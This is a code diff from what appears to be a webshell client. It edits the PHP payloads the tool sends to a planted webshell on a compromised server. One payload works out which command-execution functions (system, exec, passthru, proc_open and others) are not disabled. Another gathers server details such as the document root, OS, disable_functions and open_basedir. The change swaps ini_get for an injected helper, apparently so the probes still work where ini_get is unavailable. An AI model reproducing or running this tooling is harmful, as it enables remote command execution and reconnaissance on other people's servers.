@@ -5,7 +5,7 @@ from urllib.parse import urlparse, unquote_plus
 
 from libs.config import alias, color, gget, gset, set_namespace
 from libs.app import value_translation
-from libs.myapp import is_windows, print_webshell_info, send, prepare_system_template, randstr, update_prompt
+from libs.myapp import is_windows, print_webshell_info, send, prepare_system_template, randstr, update_prompt, get_ini_value_code
 
 """
 url ['webshell']
@@ -29,13 +29,16 @@ webshell.from_log ['webshell'] Whether connect from log
 
 def get_detectd_exec_php():
     return """$a=array('system', 'exec', 'shell_exec', 'passthru', 'proc_open', 'popen','pcntl_exec');
-$disabled = explode(',', ini_get('disable_functions'));
+if(!function_exists('get_ini_value')) {
+    %s
+}
+$disabled = explode(',', get_ini_value('disable_functions'));
 foreach ($a as $v){
     if (function_exists($v) && !in_array($v, $disabled)){
         echo $v;
         break;
     }
-}"""
+}""" % (get_ini_value_code())
 
 
 @alias(True, "c", u="url", m="method", p="pwd")
@@ -135,13 +138,11 @@ def run(url: str, method: str = "GET", pwd: str = "pass", *encoders_or_params):
              1].split("|" + version_flag_end)[0], namespace="webshell")
         info_req = send(
             """
-if (!function_exists('ini_get')) {
-    function ini_get($v) {
-        return "error";
-    }
+if(!function_exists('get_ini_value')) {
+    %s
 }
 $bit=PHP_INT_SIZE==4?32:64;
-print($_SERVER['DOCUMENT_ROOT'].'|'.php_uname().'|'.$_SERVER['SERVER_SOFTWARE'].'|'.getcwd().'|'.sys_get_temp_dir().'|'.ini_get('disable_functions').'|'.ini_get('open_basedir').'|'.$bit.'|'.DIRECTORY_SEPARATOR);""".strip()
+print($_SERVER['DOCUMENT_ROOT'].'|'.php_uname().'|'.$_SERVER['SERVER_SOFTWARE'].'|'.getcwd().'|'.sys_get_temp_dir().'|'.get_ini_value('disable_functions').'|'.get_ini_value('open_basedir').'|'.$bit.'|'.DIRECTORY_SEPARATOR);""".strip() % (get_ini_value_code())
         )
         info = info_req.r_text.strip().split("|")
         exec_func = send(get_detectd_exec_php()).r_text.strip()
